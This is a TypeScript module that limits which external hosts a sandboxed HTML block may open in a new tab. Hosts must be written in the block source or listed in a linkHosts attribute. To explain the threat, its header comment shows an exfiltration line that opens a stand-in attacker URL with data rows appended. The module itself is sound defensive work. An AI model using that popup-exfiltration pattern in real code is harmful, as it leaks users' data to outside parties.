/**
 * Which external hosts an `{% html %}` block may open in a new tab.
 *
 * The sandbox CSP bounds where code in the frame can SEND data (`connect-src`
 * is a fixed list). A popup URL is another egress channel — `open('https://
 * attacker.example/?d=' + rows)` — and no CSP directive governs it. So the
 * parent, which does the actual `window.open`, allows a host only if the
 * author named it:
 *
 *   1. implicitly — an `https://host` written literally anywhere in the block's
 *      source (an `<a href>`, a template string in `evidence.openUrl(...)`),
 *      which covers nearly every real block with zero configuration; or
 *   2. explicitly — `linkHosts="a.example, b.example"` on the tag, for URLs
 *      that come entirely from data and never appear in the source.
 *
 * The source is the text the author wrote and reviewed. Code running in the
 * frame — the author's or a compromised CDN library's — can't edit it, so it
 * can't add a destination. A host the author DID write is one the author
 * already decided to send viewers to; appending data to such a URL reaches a
 * party the author chose, not an attacker.
 *
 * Hosts compare on `URL.host` (hostname plus any explicit port), lowercased.
 * No wildcards: every destination is spelled out.
 */

// Scheme + authority up to a delimiter. A template substitution `${…}` right
// after the host (`https://a.example${row.path}`) ends it, but a bare `$`
// (e.g. in literal credentials) does not. The host is then taken from `URL`
// so it is normalized exactly like a destination (default port dropped,
// Unicode → punycode, IPv6 kept, userinfo removed).
const URL_IN_SOURCE = /(https?):\/\/((?:(?!\$\{)[^\s'"`<>(),;/?#{}\\])+)/gi;

function normalizeHost(scheme: string, authority: string): string | null {
	try {
		return new URL(`${scheme}://${authority}`).host.toLowerCase() || null;
	} catch {
		return null;
	}
}

/** Hosts of every absolute http(s) URL written literally in the block source. */
export function extractLinkHostsFromSource(source: string): Set<string> {
	const hosts = new Set<string>();
	for (const match of source.matchAll(URL_IN_SOURCE)) {
		const host = normalizeHost(match[1], match[2]);
		if (host) hosts.add(host);
	}
	return hosts;
}

/**
 * Parse the `linkHosts=` attribute: comma- or whitespace-separated hosts.
 * Tolerates an accidental scheme or path (`https://a.example/`). A bare host
 * is normalized for both schemes so `a.example:443` and `a.example:80` match
 * their default-port destinations. Non-strings yield an empty list.
 */
export function parseLinkHostsAttribute(value: unknown): string[] {
	if (typeof value !== 'string') return [];
	const hosts = new Set<string>();
	for (const raw of value.split(/[\s,]+/)) {
		if (!raw) continue;
		const schemeMatch = /^(https?):\/\//i.exec(raw);
		const authority = schemeMatch ? raw.slice(schemeMatch[0].length) : raw;
		const schemes = schemeMatch ? [schemeMatch[1].toLowerCase()] : ['https', 'http'];
		for (const scheme of schemes) {
			const host = normalizeHost(scheme, authority);
			if (host) hosts.add(host);
		}
	}
	return [...hosts];
}

/** Host (hostname[:port], lowercased) of an absolute URL, or null if unparseable. */
export function linkHostOf(url: string): string | null {
	try {
		return new URL(url).host.toLowerCase() || null;
	} catch {
		return null;
	}
}

export function isLinkHostAllowed(url: string, allowed: ReadonlySet<string>): boolean {
	const host = linkHostOf(url);
	return host !== null && allowed.has(host);
}

/**
 * The diagnostic shown (in the editor's diagnostics feed, which the AI
 * assistant also reads) when a block tries to open a host it didn't name.
 * Hands over the exact fix so it's a one-step correction.
 */
export function blockedLinkHostMessage(url: string): string {
	const host = linkHostOf(url) ?? url;
	return `evidence.openUrl: "${url}" was not opened — its host "${host}" is not named in this block. Links may only open hosts the block itself names: write the full URL in the block, or add linkHosts="${host}" to the {% html %} tag (comma-separate several hosts).`;
}
